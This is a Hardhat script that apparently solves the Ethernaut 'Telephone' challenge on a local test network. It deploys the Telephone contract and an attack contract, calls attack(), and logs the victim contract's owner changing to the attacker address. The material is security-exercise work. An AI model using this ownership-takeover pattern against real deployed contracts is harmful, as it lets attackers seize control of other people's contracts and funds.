import {ethers} from "hardhat";

async function main() {
  const [owner, attacker] = await ethers.getSigners(); // get the owner and attacker addresses
  const Telephone = await ethers.getContractFactory("Telephone"); // get the Telephone contract factory
  const telephone = await Telephone.deploy(); // deploy the Telephone contract

  console.log("Telephone Contract Instance address:", telephone.address); // log the Telephone contract address
  console.log("Owner address:", owner.address); // log the owner address
  console.log("Telephone Owner address:", await telephone.owner()); // log the owner address in the Telephone contract

  const TelephoneAttack = await ethers.getContractFactory("TelephoneAttack"); // get the TelephoneAttack contract factory
  const telephoneAttack = await TelephoneAttack.deploy(telephone.address); // deploy the TelephoneAttack contract
  console.log(
    "TelephoneAttack Contract Instance address:",
    telephoneAttack.address
  ); // log the TelephoneAttack contract address

  const victimAddressInattackContract = await telephoneAttack.telephoneContract(); // get the victim contract address in the TelephoneAttack contract
  console.log(
    "Victim address in attack contract:",
    victimAddressInattackContract
  ); // log the victim address in the TelephoneAttack contract

    console.log("Attacker address:", attacker.address); // log the attacker address
    console.log("Before the Attack, Address is:", await telephone.owner()); // log the owner address in the victim contract

    // call the attack contract
    await telephoneAttack.attack(attacker.address);

    // check the owner address in the victim contract
    const ownerAddress = await telephone.owner();
    console.log("After the Attrack, address changed:", ownerAddress);

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
}); 
